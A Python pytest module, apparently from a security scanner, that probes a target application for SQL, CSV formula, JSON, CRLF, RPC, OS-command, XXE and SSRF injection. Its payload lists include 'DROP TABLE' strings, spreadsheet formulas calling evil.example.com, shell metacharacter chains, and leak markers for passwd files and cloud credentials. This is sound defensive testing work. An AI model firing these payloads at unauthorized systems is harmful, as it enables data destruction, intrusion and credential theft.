"""Injection tests: SQL injection, CSV formula injection, JSON injection,
CRLF header injection, RPC parameter injection, plus the §P1-F injection-breadth
family — OS-command injection, XXE, and SSRF.

Test categories:
- SQL injection via API parameters (all authenticated and anonymous endpoints)
- CSV formula injection via file upload endpoints
- JSON structural injection (deeply nested, prototype pollution payloads)
- CRLF header injection
- Supabase RPC parameter injection (all client-callable RPCs)
- OS-command injection (ASVS V1.2.5, CWE-78) — time-based oracle / metacharacter
- XXE (ASVS V1.5.1, CWE-611) — in-band external-entity payload (OOB parameter-
  entity payload ships as a manual/documented fixture, not auto-asserted)
- SSRF (ASVS V1.3.6 / V15.3.2, CWE-918) — internal/metadata target dereference;
  the live SSRF probe is hard-gated behind SSRF_PROBE_ACK=1 until SECURITY.md
  gains SSRF / internal-network probing authorization language.
"""

from __future__ import annotations

import json
import os
import sys as _sys
import time
import uuid
from pathlib import Path
from urllib.parse import unquote

import httpx
import pytest

# ---------------------------------------------------------------------------
# Fixture path
# ---------------------------------------------------------------------------

_FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"

# ---------------------------------------------------------------------------
# Ensure the StackBadger package root is importable at collection time.
# ---------------------------------------------------------------------------

_PKG_ROOT = Path(__file__).resolve().parent.parent
if str(_PKG_ROOT) not in _sys.path:
    _sys.path.insert(0, str(_PKG_ROOT))

from helpers import send_request  # noqa: E402


# ---------------------------------------------------------------------------
# Collection-time profile loading for parametrize decorators
# ---------------------------------------------------------------------------

def _collection_profile():
    """Load profile at collection time for parametrize decorators."""
    try:
        from profile import load_profile, resolve_profile_path  # type: ignore[import]
        return load_profile(resolve_profile_path(_PKG_ROOT))
    except Exception:
        return None


_PROFILE = _collection_profile()


def _collection_endpoints(category: str) -> list[dict]:
    """Get endpoints for parametrize — returns empty list if profile unavailable."""
    if _PROFILE is None:
        return []
    from conftest import endpoints_for_category
    return endpoints_for_category(_PROFILE, category)


def _collection_rpcs(tier: str) -> list[dict]:
    """Get RPCs for parametrize — returns empty list if profile unavailable."""
    if _PROFILE is None:
        return []
    from conftest import all_rpcs
    return all_rpcs(_PROFILE, tier)


# Endpoints with probe bodies (suitable for injection via body fields).
_ALL_ENDPOINTS_WITH_PROBE = [
    ep for ep in (
        _collection_endpoints("authenticated") + _collection_endpoints("anonymous")
    )
    if ep.get("probe_body")
]

# Paths of all authenticated + anonymous endpoints (for path-only parametrize).
_ALL_ENDPOINT_PATHS = [
    ep.get("path", "")
    for ep in (
        _collection_endpoints("authenticated") + _collection_endpoints("anonymous")
    )
    if ep.get("path")
]

# Client-callable RPCs for RPC injection tests.
_CLIENT_CALLABLE_RPCS = _collection_rpcs("client_callable")


# ---------------------------------------------------------------------------
# SQL injection payloads
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS: list[str] = [
    "' OR 1=1 --",
    "'; DROP TABLE uploads --",
    "1 UNION SELECT null, null, null --",
    "' OR '1'='1",
    "1; SELECT pg_sleep(5) --",
    "' AND 1=CAST((SELECT version()) AS INT) --",
    "\\'; DROP TABLE users; --",
]

# ---------------------------------------------------------------------------
# CSV formula injection payloads (spreadsheet injection)
# ---------------------------------------------------------------------------

_FORMULA_PATTERNS: list[str] = [
    "=cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    '=HYPERLINK("http://evil.example.com")',
    "=1+1",
    "=IMPORTDATA(\"http://evil.example.com\")",
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _endpoint_url(profile, path: str) -> str:
    base = (profile.target.base_url or "").rstrip("/")
    prefix = (profile.target.api_prefix or "/.netlify/functions").rstrip("/")
    return f"{base}{prefix}{path}"


def _assert_no_data_leak(resp: httpx.Response, payloads: list[str], context: str) -> None:
    """Assert that none of the injection payloads are echoed back in the response body."""
    body = resp.text
    for payload in payloads:
        assert payload not in body, (
            f"{context}: response body echoed back injection payload: {payload!r}"
        )


def _assert_safe_status(resp: httpx.Response, context: str) -> None:
    """Assert that the response is not a 500 (unhandled server error)."""
    assert resp.status_code != 500, (
        f"{context}: returned 500 (unhandled server error) — "
        "injection payload may have caused an unhandled exception"
    )


def _endpoint_id(ep: dict) -> str:
    """Human-readable pytest ID for an endpoint."""
    method = ep.get("method", "POST")
    path = ep.get("path", "unknown")
    return f"{method}:{path}"


def _rpc_id(rpc: dict) -> str:
    return rpc.get("name", "unknown")


# ---------------------------------------------------------------------------
# SQL injection via all endpoints with probe bodies
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "endpoint",
    _ALL_ENDPOINTS_WITH_PROBE,
    ids=[_endpoint_id(e) for e in _ALL_ENDPOINTS_WITH_PROBE],
)
@pytest.mark.parametrize("payload", _SQLI_PAYLOADS, ids=[f"sqli:{p[:20]!r}" for p in _SQLI_PAYLOADS])
def test_sqli_endpoint_probe_fields(payload, endpoint, profile, evidence):
    """Inject SQL payloads into all probe_body fields of each endpoint.

    Each field in the probe_body is replaced with the SQL payload in turn.
    The endpoint must return 4xx or 2xx (never 500) and must not reflect
    raw SQL in the response body.
    """
    from conftest import probe_body_for
    path = endpoint.get("path", "")
    method = endpoint.get("method", "POST")
    url = _endpoint_url(profile, path)
    base_body = probe_body_for(endpoint)

    # Inject the payload into every field of the probe body.
    for field in list(base_body.keys()):
        injected_body = dict(base_body)
        injected_body[field] = payload
        resp = send_request(method, url, json_body=injected_body)
        context = f"{method} {path} {field}={payload!r}"
        _assert_safe_status(resp, context)
        assert resp.status_code in range(200, 500), (
            f"{context}: returned {resp.status_code}; expected 2xx or 4xx, not 5xx"
        )
        _assert_no_data_leak(resp, _SQLI_PAYLOADS, context)
        if resp.status_code not in (400, 401, 403, 422):
            evidence.capture(resp, f"sqli_{path.lstrip('/')}_{field}_status_{resp.status_code}")


# ---------------------------------------------------------------------------
# CSV formula injection via file upload endpoints
# ---------------------------------------------------------------------------

def test_csv_formula_injection_upload(profile, evidence):
    """Upload the injection fixture to the upload endpoint; response must not echo formula payloads."""
    # The profile's upload endpoint is the single source of truth — skip when absent.
    upload_path = profile.uploads and profile.uploads.endpoint
    if not upload_path:
        pytest.skip("No upload endpoint defined in profile (profile.uploads.endpoint)")
    path = upload_path
    url = _endpoint_url(profile, path)
    fixture_path = _FIXTURES / "records_injection.csv"
    if not fixture_path.exists():
        pytest.skip(f"Fixture not found: {fixture_path}")
    content = fixture_path.read_bytes()
    files = {"file": ("records_injection.csv", content, "text/csv")}
    resp = send_request("POST", url, files=files)
    context = f"POST {path} (records_injection.csv)"
    _assert_safe_status(resp, context)
    # The response must not reflect raw formula strings that could be injected
    # into a downstream spreadsheet via the API response.
    _assert_no_data_leak(resp, _FORMULA_PATTERNS, context)
    if resp.status_code not in (200, 400, 401, 403, 422):
        evidence.capture(resp, f"csv_formula_injection_status_{resp.status_code}")


# ---------------------------------------------------------------------------
# JSON injection — deeply nested object (100 levels)
# ---------------------------------------------------------------------------

def _make_nested(depth: int) -> dict:
    """Build a JSON object nested to the given depth."""
    obj: dict = {"leaf": "value"}
    for _ in range(depth):
        obj = {"nested": obj}
    return obj


@pytest.mark.parametrize("path", _ALL_ENDPOINT_PATHS, ids=_ALL_ENDPOINT_PATHS)
def test_json_deep_nesting(path, profile, evidence):
    """Endpoints must not crash (500) when sent a 100-level nested JSON object."""
    url = _endpoint_url(profile, path)
    body = _make_nested(100)
    resp = send_request("POST", url, json_body=body)
    context = f"POST {path} (100-level nested JSON)"
    _assert_safe_status(resp, context)
    assert resp.status_code in range(200, 500), (
        f"{context}: returned {resp.status_code}; expected 2xx or 4xx"
    )
    if resp.status_code not in (400, 401, 403, 413, 422):
        evidence.capture(resp, f"json_deep_nesting_status_{resp.status_code}")


# ---------------------------------------------------------------------------
# JSON injection — prototype pollution via __proto__
# ---------------------------------------------------------------------------

_PROTOTYPE_PAYLOADS: list[dict] = [
    {"__proto__": {"admin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"isAdmin": True, "role": "superuser"}},
]


@pytest.mark.parametrize("path", _ALL_ENDPOINT_PATHS, ids=_ALL_ENDPOINT_PATHS)
@pytest.mark.parametrize(
    "proto_payload",
    _PROTOTYPE_PAYLOADS,
    ids=[f"proto:{list(p.keys())[0]}" for p in _PROTOTYPE_PAYLOADS],
)
def test_json_prototype_pollution(path, proto_payload, profile, evidence):
    """Endpoints must not crash or grant elevated access via prototype pollution payloads."""
    url = _endpoint_url(profile, path)
    resp = send_request("POST", url, json_body=proto_payload)
    context = f"POST {path} (prototype pollution: {proto_payload!r})"
    _assert_safe_status(resp, context)
    assert resp.status_code in range(200, 500), (
        f"{context}: returned {resp.status_code}; expected 2xx or 4xx"
    )
    # A 200 with no body change is acceptable only if this represents an auth rejection
    # wrapped as 200 — in practice we expect 400/401.
    if resp.status_code == 200:
        evidence.capture(resp, "json_prototype_pollution_200_review")
    if resp.status_code not in (400, 401, 403, 422):
        evidence.capture(resp, f"json_prototype_pollution_status_{resp.status_code}")


# ---------------------------------------------------------------------------
# CRLF header injection
# ---------------------------------------------------------------------------

_CRLF_PAYLOADS: list[str] = [
    "value\r\nX-Injected: true",
    "value\r\nSet-Cookie: session=injected",
    "value\r\n\r\n<html>injected</html>",
    "value%0d%0aX-Injected: true",
    "value%0aX-Injected: true",
]


@pytest.mark.parametrize("path", _ALL_ENDPOINT_PATHS, ids=_ALL_ENDPOINT_PATHS)
@pytest.mark.parametrize(
    "crlf_value",
    _CRLF_PAYLOADS,
    ids=[f"crlf:{v[:20]!r}" for v in _CRLF_PAYLOADS],
)
def test_crlf_header_injection(path, crlf_value, profile, evidence):
    """Endpoints must not crash or reflect injected headers for CRLF payloads in custom headers.

    httpx will raise on literal CRLF in header values (RFC 7230 compliance).
    Percent-encoded variants are passed through to test server-side decoding.
    """
    url = _endpoint_url(profile, path)
    try:
        headers = {"X-Custom-Header": crlf_value}
        resp = send_request("POST", url, headers=headers, json_body={"test": "crlf"})
        context = f"POST {path} (CRLF header: {crlf_value!r})"
        _assert_safe_status(resp, context)
        # Injected header must not appear in the response headers.
        response_header_names = [k.lower() for k in resp.headers.keys()]
        assert "x-injected" not in response_header_names, (
            f"{context}: response contained injected 'X-Injected' header — CRLF injection succeeded"
        )
        if resp.status_code not in (200, 400, 401, 403, 422):
            evidence.capture(resp, f"crlf_injection_status_{resp.status_code}")
    except (httpx.LocalProtocolError, ValueError):
        # httpx refuses to send literal CRLF in headers — this is correct client-side
        # enforcement. The test passes because the payload cannot even be transmitted.
        pass


# ---------------------------------------------------------------------------
# RPC parameter injection — all client-callable RPCs
# ---------------------------------------------------------------------------

@pytest.mark.write_probe
@pytest.mark.supabase
@pytest.mark.parametrize(
    "rpc",
    _CLIENT_CALLABLE_RPCS,
    ids=[_rpc_id(r) for r in _CLIENT_CALLABLE_RPCS],
)
@pytest.mark.parametrize("payload", _SQLI_PAYLOADS, ids=[f"sqli:{p[:20]!r}" for p in _SQLI_PAYLOADS])
def test_rpc_sqli(payload, rpc, profile, anon_client, evidence):
    """Client-callable RPCs must not accept SQLi payloads in their parameters.

    Supabase PostgREST parameterises RPC arguments; this test verifies the
    endpoint does not expose raw SQL concatenation errors or data leaks.
    """
    supabase_url = (profile.supabase and profile.supabase.project_url) or ""
    if not supabase_url:
        pytest.skip("profile.supabase.project_url not set")
    rpc_name = rpc.get("name", "")
    rpc_url = supabase_url.rstrip("/") + f"/rest/v1/rpc/{rpc_name}"
    params = rpc.get("params") or []

    # Inject the SQLi payload into the first string-typed param; fill others with safe values.
    body: dict = {}
    first_injected = False
    for param in params:
        param_name = param if isinstance(param, str) else (param.get("name", "") if hasattr(param, "get") else str(param))
        if not first_injected:
            body[param_name] = payload
            first_injected = True
        elif "action" in param_name:
            body[param_name] = "include"
        elif "attestation" in param_name:
            body[param_name] = False
        else:
            body[param_name] = str(uuid.uuid4())

    if not body:
        body = {str(params[0]) if params else "anon_id": payload}

    resp = anon_client.post(rpc_url, json=body)
    context = f"RPC {rpc_name} sqli payload={payload!r}"
    _assert_safe_status(resp, context)
    _assert_no_data_leak(resp, _SQLI_PAYLOADS, context)
    if resp.status_code not in (200, 400, 401, 403, 404, 422):
        evidence.capture(resp, f"rpc_{rpc_name}_sqli_status_{resp.status_code}")


# ===========================================================================
# §P1-F Injection breadth: OS-command injection · XXE · SSRF
# ---------------------------------------------------------------------------
# Heavy ASVS-scope probes (asvs_extended; deselected unless SCAN_SCOPE=asvs).
# Each is dual-tagged asvs(...) + cwe(...) for the coverage ledger. These send
# payloads to existing endpoints expecting REJECTION / no-effect — observational
# sends, NOT write_probe (matching the rest of this module). Every endpoint /
# RPC is derived from the active profile; nothing is hardcoded.
# ===========================================================================

# Free-text fields that plausibly reach a shell / template / interpolation sink.
_FREE_TEXT_HINTS = (
    "name", "title", "label", "comment", "message", "note", "description",
    "query", "search", "text", "input", "value", "filename", "path", "host",
    "domain", "cmd", "command", "arg",
)

# Field names that plausibly accept a URL the server may fetch (SSRF sinks).
_URL_FIELD_HINTS = (
    "url", "uri", "link", "src", "source", "href", "callback", "webhook",
    "redirect", "redirect_uri", "return_url", "next", "image", "img",
    "avatar", "icon", "fetch", "endpoint", "target", "proxy", "feed",
    "import_url", "remote", "file_url",
)


def _is_url_field(field: str) -> bool:
    fl = field.lower()
    return any(h in fl for h in _URL_FIELD_HINTS)


def _is_free_text_field(field: str) -> bool:
    fl = field.lower()
    return any(h in fl for h in _FREE_TEXT_HINTS)


# ---------------------------------------------------------------------------
# OS-command injection (ASVS V1.2.5, CWE-78)
# ---------------------------------------------------------------------------
# Time-based oracle: a shell metacharacter chained to `sleep 5` should NOT add
# ~5s to the response when the input is handled safely. We compare an injected
# request's latency against a plain-text baseline (mirrors the pg_sleep style of
# the SQLi payloads, measured here rather than only echoed).

# Nominal delay the time-based payloads request, in seconds.
_OSCMD_DELAY = 5
# Per-injected-sample latency delta (s) over the ADJACENT benign sample above
# which we treat the delay as command execution. Compared against a benign
# request taken immediately before each payload (not a once-up-front baseline),
# so a serverless cold start that lands on either request cancels out instead of
# producing a false HIGH.
_OSCMD_DELAY_THRESHOLD = 4.0
# Cumulative wall-clock budget (s) for one parametrized case. Once exceeded we
# stop sending further payloads so a slow/cold target cannot make the case run
# for minutes.
_OSCMD_TIME_BUDGET = 60.0

# Arithmetic-evaluation reflection oracle. Only a shell that evaluates the
# injected command turns ``$((6*7))`` into 42, so asserting on the EVALUATED
# result (not a literal marker) is immune to endpoints that merely echo input.
_OSCMD_ARITH_MARKER = "SB$((6*7))END"
_OSCMD_ARITH_RESULT = "SB42END"

_OSCMD_PAYLOADS: list[str] = [
    # POSIX shell sinks.
    f"; sleep {_OSCMD_DELAY}",
    f"| sleep {_OSCMD_DELAY}",
    f"& sleep {_OSCMD_DELAY}",
    f"&& sleep {_OSCMD_DELAY}",
    f"$(sleep {_OSCMD_DELAY})",
    f"`sleep {_OSCMD_DELAY}`",
    f"; ping -c {_OSCMD_DELAY} 127.0.0.1",
    # Windows cmd.exe sinks (POSIX `-c` is malformed on Windows ping; `-n` /
    # `timeout` are the native delay forms so both sinks are covered).
    f"& ping -n {_OSCMD_DELAY} 127.0.0.1",
    f"& timeout /t {_OSCMD_DELAY}",
    # Arithmetic-evaluation oracle: only a shell that evaluates the injected
    # command turns `$((6*7))` into 42. A handler that merely REFLECTS the input
    # echoes the literal `SB$((6*7))END`, which can never contain `SB42END` — so
    # this avoids the false positive of a plain echo/validation endpoint that
    # reflects the marker without running a shell.
    f"; echo {_OSCMD_ARITH_MARKER}",
]

# Endpoints carrying at least one free-text field (OS-command injection sinks).
_OSCMD_ENDPOINTS = [
    ep for ep in _ALL_ENDPOINTS_WITH_PROBE
    if any(_is_free_text_field(f) for f in (ep.get("probe_body") or {}).keys())
]


def _is_timing_payload(payload: str) -> bool:
    """True for payloads that intend to add a measurable delay (the timing oracle)."""
    return any(tok in payload for tok in ("sleep", "ping", "timeout"))


def _timed_send(method, url, body):
    """Send one request and return (response, elapsed_seconds)."""
    t0 = time.perf_counter()
    resp = send_request(method, url, json_body=body, timeout=20.0)
    return resp, time.perf_counter() - t0


@pytest.mark.asvs_extended
@pytest.mark.asvs("1.2.5")
@pytest.mark.cwe("78")
@pytest.mark.parametrize(
    "endpoint",
    _OSCMD_ENDPOINTS,
    ids=[_endpoint_id(e) for e in _OSCMD_ENDPOINTS],
)
def test_oscmd_injection_time_oracle(endpoint, profile, evidence):
    """OS-command injection via free-text params, proved by a timing oracle.

    Injects shell-metacharacter payloads (`; sleep 5`, `$(sleep 5)`, ...) into
    each free-text field. A safe handler treats the value as opaque data: no
    measurable delay, no command-echo reflection, and never a 500.

    Cold-start defence: each timing payload is compared against a benign request
    taken IMMEDIATELY before it (a paired adjacent sample), so a serverless cold
    start that inflates one request does not register as a delta. A single hit is
    treated as suspicion only; we require a confirmation re-test (a second
    adjacent benign/injected pair that also clears the threshold) before failing,
    and we stop once the cumulative time budget is spent so a slow target cannot
    drag the case out for minutes (ASVS V1.2.5, CWE-78).
    """
    from conftest import probe_body_for
    path = endpoint.get("path", "")
    method = endpoint.get("method", "POST")
    url = _endpoint_url(profile, path)
    base_body = probe_body_for(endpoint)

    free_fields = [f for f in base_body.keys() if _is_free_text_field(f)]
    if not free_fields:
        pytest.skip(f"{path}: no free-text field to target for OS-command injection")

    def _benign_then_injected(field, payload):
        """Adjacent benign-then-injected pair; return (resp, injected-vs-benign delta)."""
        benign_body = dict(base_body)
        benign_body[field] = "stackbadger-baseline"
        _, benign_elapsed = _timed_send(method, url, benign_body)
        injected = dict(base_body)
        injected[field] = payload
        resp, inj_elapsed = _timed_send(method, url, injected)
        return resp, inj_elapsed, benign_elapsed, inj_elapsed - benign_elapsed

    case_start = time.perf_counter()
    for field in free_fields:
        for payload in _OSCMD_PAYLOADS:
            if time.perf_counter() - case_start > _OSCMD_TIME_BUDGET:
                # Slow/cold target: stop sending further payloads. No finding is
                # asserted from an exhausted budget (avoids minutes-long cases).
                return
            context = f"{method} {path} {field}={payload!r}"
            resp, inj_elapsed, benign_elapsed, delta = _benign_then_injected(field, payload)

            _assert_safe_status(resp, context)
            # The EVALUATED arithmetic result proves shell substitution; a plain
            # echo/validation endpoint reflects the literal `SB$((6*7))END`, which
            # cannot contain `SB42END`, so reflection alone does not trip this.
            assert _OSCMD_ARITH_RESULT not in resp.text, (
                f"{context}: response contained the evaluated arithmetic result "
                f"{_OSCMD_ARITH_RESULT!r} — the shell evaluated the injected "
                "`echo` (ASVS V1.2.5, CWE-78)."
            )

            if _is_timing_payload(payload):
                suspicious = (
                    inj_elapsed >= _OSCMD_DELAY_THRESHOLD
                    and delta >= _OSCMD_DELAY_THRESHOLD
                )
                if suspicious:
                    # Confirmation re-test: re-run the adjacent pair. A genuine
                    # injected sleep reproduces; a one-off cold start does not.
                    resp2, inj2, benign2, delta2 = _benign_then_injected(field, payload)
                    _assert_safe_status(resp2, context)
                    confirmed = inj2 >= _OSCMD_DELAY_THRESHOLD and delta2 >= _OSCMD_DELAY_THRESHOLD
                    if confirmed:
                        evidence.capture(
                            resp2,
                            f"oscmd_timeoracle_{path.lstrip('/')}_{field}_"
                            f"{inj_elapsed:.1f}s+{inj2:.1f}s_delta_"
                            f"{delta:.1f}s+{delta2:.1f}s",
                        )
                    assert not confirmed, (
                        f"{context}: injected request ran {inj_elapsed:.1f}s "
                        f"(+{delta:.1f}s over its adjacent benign sample) and "
                        f"reproduced on re-test at {inj2:.1f}s (+{delta2:.1f}s) — "
                        f"the `{payload}` payload appears to have executed a shell "
                        "delay (ASVS V1.2.5, CWE-78)."
                    )
            if resp.status_code not in (200, 400, 401, 403, 422):
                evidence.capture(
                    resp, f"oscmd_{path.lstrip('/')}_{field}_status_{resp.status_code}"
                )


# ---------------------------------------------------------------------------
# XXE — external-entity resolution (ASVS V1.5.1, CWE-611)
# ---------------------------------------------------------------------------
# Markers that, if reflected, prove a file-disclosure entity resolved.
# All markers below are LITERAL substrings (no regex) — each is tested with a
# plain ``marker not in body`` membership check, so a pattern like ``root:.*:0:0:``
# would never match real /etc/passwd output and is deliberately excluded.
_XXE_LEAK_MARKERS = (
    "root:x:0:0:",          # /etc/passwd first line (standard shadowed password)
    "root:!:0:0:",          # /etc/passwd with locked password field
    "root::0:0:",           # /etc/passwd with empty password field
    "[fonts]",              # win.ini section (literal substring)
    "for 16-bit app support",  # win.ini comment (literal substring)
)

# XML payload fixtures exercised by the IN-BAND assertion below. Only
# ``xxe_classic.xml`` is in-band observable: a vulnerable parser reflects the
# disclosed file content directly in the response, which ``marker not in body``
# can catch. ``xxe_oob.xml`` is intentionally NOT listed here — it is an
# out-of-band parameter-entity exfil payload whose only signal is an outbound
# fetch to a collaborator/canary, which an in-band response check can never
# observe (it would pass even against a vulnerable parser). It ships as a
# manual/documented payload; see fixtures/xxe_oob.xml.
_XXE_FIXTURES = ("xxe_classic.xml",)


def _xml_capable_endpoints(profile) -> list[dict]:
    """Endpoints plausibly accepting XML, derived from the profile.

    An endpoint qualifies when its declared format/content-type is XML, or when
    the upload endpoint's format is xml. No app names are hardcoded.
    """
    eps = (
        _collection_endpoints("authenticated")
        + _collection_endpoints("anonymous")
        + _collection_endpoints("internal")
    )
    out = []
    for ep in eps:
        fmt = str(ep.get("format") or "").lower()
        ctype = str(ep.get("content_type") or ep.get("accepts") or "").lower()
        if "xml" in fmt or "xml" in ctype:
            out.append(ep)
    # An XML-format upload endpoint is also a candidate.
    up = profile.uploads
    if up and str(getattr(up, "format", "") or "").lower() == "xml" and getattr(up, "endpoint", None):
        out.append({"path": up.endpoint, "method": "POST", "format": "xml"})
    return out


@pytest.mark.asvs_extended
@pytest.mark.asvs("1.5.1")
@pytest.mark.cwe("611")
@pytest.mark.parametrize("fixture_name", _XXE_FIXTURES, ids=list(_XXE_FIXTURES))
def test_xxe_external_entity(fixture_name, profile, evidence):
    """XML endpoints must not resolve external entities (XXE).

    Posts a classic in-band file-disclosure entity to each profile-declared XML
    endpoint. A hardened parser disables DOCTYPE/external-entity processing: the
    entity must NOT resolve, so no local file content is reflected (ASVS V1.5.1,
    CWE-611). Skips cleanly when the profile declares no XML-capable endpoint.

    Only the in-band fixture is asserted here. The out-of-band parameter-entity
    payload (fixtures/xxe_oob.xml) is a manual/documented payload: its signal is
    an outbound fetch to a collaborator/canary, which an in-band response check
    cannot observe, so asserting on it would always pass and mask a real XXE.
    """
    xml_endpoints = _xml_capable_endpoints(profile)
    if not xml_endpoints:
        pytest.skip(
            "No XML-capable endpoint in profile (declare an endpoint with "
            "format: xml / content_type: application/xml, or an xml upload "
            "format, to enable the V1.5.1 XXE probe)."
        )

    fixture_path = _FIXTURES / fixture_name
    if not fixture_path.exists():
        pytest.skip(f"XXE fixture not found: {fixture_path}")
    xml_bytes = fixture_path.read_bytes()

    for ep in xml_endpoints:
        path = ep.get("path", "")
        method = ep.get("method", "POST")
        url = _endpoint_url(profile, path)
        headers = {"Content-Type": "application/xml"}
        resp = send_request(method, url, headers=headers, content=xml_bytes, timeout=20.0)
        context = f"{method} {path} ({fixture_name})"
        _assert_safe_status(resp, context)

        body = resp.text
        for marker in _XXE_LEAK_MARKERS:
            assert marker not in body, (
                f"{context}: response reflected file-disclosure marker "
                f"{marker!r} — the XML parser resolved an external entity "
                "(ASVS V1.5.1, CWE-611)."
            )
        # The literal entity name must not be reflected resolved-or-raw in a way
        # that suggests the parser processed the DOCTYPE.
        if "root:" in body or "[fonts]" in body:
            evidence.capture(resp, f"xxe_{path.lstrip('/')}_{fixture_name}_leak_review")
        if resp.status_code not in (200, 400, 401, 403, 415, 422):
            evidence.capture(
                resp, f"xxe_{path.lstrip('/')}_{fixture_name}_status_{resp.status_code}"
            )


# ---------------------------------------------------------------------------
# SSRF — internal / metadata target dereference (ASVS V1.3.6 / V15.3.2, CWE-918)
# ---------------------------------------------------------------------------
# HARD PRECONDITION (plan §P1-F): SSRF makes the TARGET initiate outbound
# connections to internal/metadata addresses — a distinct trust boundary that
# SECURITY.md does not yet authorize. The live probe MUST NOT fire until both an
# explicit env acknowledgment (SSRF_PROBE_ACK=1) AND written SSRF authorization
# language in SECURITY.md exist. The gate below mirrors the --yes/PENTEST_MODE
# pattern: absent the ack, the test skips with the precondition reason.

_SSRF_ACK_ENV = "SSRF_PROBE_ACK"
_SSRF_SKIP_REASON = (
    "SSRF probe gated: SECURITY.md must first gain explicit 'SSRF / "
    "internal-network probing' authorization language, and the acknowledgment "
    "gate (SSRF_PROBE_ACK=1) plus written authorization are required before a "
    "live run. SSRF causes the TARGET to open outbound connections to internal/"
    "metadata addresses (a distinct trust boundary); the probe and its offline "
    "fixtures (fixtures/ssrf_targets.txt) ship, but live firing stays gated."
)


def _load_ssrf_targets() -> list[str]:
    """Read SSRF target URLs from the reviewable offline fixture.

    Comment (`#`) and blank lines are skipped. Returns an empty list if the
    fixture is missing (the test then skips).
    """
    fixture_path = _FIXTURES / "ssrf_targets.txt"
    if not fixture_path.exists():
        return []
    targets: list[str] = []
    for line in fixture_path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        targets.append(stripped)
    return targets


# Markers that prove the server dereferenced an internal URL — these are RESPONSE
# CONTENT (metadata-document keys, credential fields, file contents), NOT URL-path
# fragments. URL-path fragments like "security-credentials" were removed because
# they appear in the injected target itself, so an endpoint that echoes the
# request URL in an error page would trip a false positive. The injected target
# is additionally stripped from the body before matching (see the probe).
_SSRF_LEAK_MARKERS = (
    "ami-id",                 # EC2 IMDS document keys
    "instance-id",
    "instance-type",
    "AccessKeyId",            # IAM security-credentials response body
    "SecretAccessKey",
    "computeMetadata",        # GCP metadata
    "root:x:0:0:",            # file:///etc/passwd
    "root:!:0:0:",
    "root::0:0:",
    "[fonts]",                # file:///c:/windows/win.ini
    "for 16-bit app support",
)

# Endpoints carrying at least one URL-shaped field (SSRF sinks).
_SSRF_ENDPOINTS = [
    ep for ep in _ALL_ENDPOINTS_WITH_PROBE
    if any(_is_url_field(f) for f in (ep.get("probe_body") or {}).keys())
]


@pytest.mark.asvs_extended
@pytest.mark.asvs("1.3.6")
@pytest.mark.asvs("15.3.2")
@pytest.mark.cwe("918")
@pytest.mark.parametrize(
    "endpoint",
    _SSRF_ENDPOINTS,
    ids=[_endpoint_id(e) for e in _SSRF_ENDPOINTS],
)
def test_ssrf_internal_targets(endpoint, profile, evidence):
    """URL-accepting endpoints must not dereference internal/metadata targets.

    Submits internal/loopback/link-local-metadata/file:// URLs (from the
    reviewable fixture) into each URL-shaped field and checks the server does
    not fetch them: no metadata document, no local-file content reflected
    (ASVS V1.3.6 / V15.3.2, CWE-918).

    HARD GATE: this live probe stays SKIPPED unless ``SSRF_PROBE_ACK=1`` is set.
    The acknowledgment exists because SSRF makes the target open outbound
    connections to internal addresses, which SECURITY.md does not yet authorize.
    Both the env ack and written SSRF authorization in SECURITY.md are required
    before firing this against any target.
    """
    if os.environ.get(_SSRF_ACK_ENV) != "1":
        pytest.skip(_SSRF_SKIP_REASON)

    from conftest import probe_body_for
    path = endpoint.get("path", "")
    method = endpoint.get("method", "POST")
    url = _endpoint_url(profile, path)
    base_body = probe_body_for(endpoint)

    url_fields = [f for f in base_body.keys() if _is_url_field(f)]
    if not url_fields:
        pytest.skip(f"{path}: no URL-shaped field to target for SSRF")

    targets = _load_ssrf_targets()
    if not targets:
        pytest.skip("SSRF target fixture missing/empty (fixtures/ssrf_targets.txt)")

    for field in url_fields:
        for target in targets:
            injected = dict(base_body)
            injected[field] = target
            context = f"{method} {path} {field}={target!r}"
            resp = send_request(method, url, json_body=injected, timeout=20.0)
            _assert_safe_status(resp, context)

            # Strip any verbatim echo of the injected target (and its decoded
            # form) so a URL-reflecting error page that quotes the request URL
            # cannot be mistaken for an actual dereference.
            body = resp.text.replace(target, "")
            decoded_target = unquote(target)
            if decoded_target != target:
                body = body.replace(decoded_target, "")
            for marker in _SSRF_LEAK_MARKERS:
                assert marker not in body, (
                    f"{context}: response reflected internal-target content "
                    f"{marker!r} — the server dereferenced the SSRF target "
                    "(ASVS V1.3.6 / V15.3.2, CWE-918)."
                )
            if resp.status_code not in (200, 400, 401, 403, 422):
                evidence.capture(
                    resp, f"ssrf_{path.lstrip('/')}_{field}_status_{resp.status_code}"
                )
